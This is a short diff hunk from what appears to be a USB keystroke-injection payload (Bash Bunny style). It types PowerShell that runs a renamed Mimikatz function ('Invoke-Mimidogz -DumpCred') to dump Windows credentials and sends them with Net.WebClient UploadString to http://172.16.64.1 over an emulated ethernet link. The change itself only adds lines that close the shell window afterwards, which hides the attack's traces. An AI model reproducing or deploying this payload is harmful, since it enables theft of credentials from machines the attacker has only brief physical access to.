@@ -48,6 +48,8 @@ Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadS
 Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/EOF\'\, \'EOF\'\)\;\"
 Q DELAY 300
 Q ENTER
+Q STRING exit
+Q ENTER
 
 # Ethernet Attack Starts
 ATTACKMODE RNDIS_ETHERNET
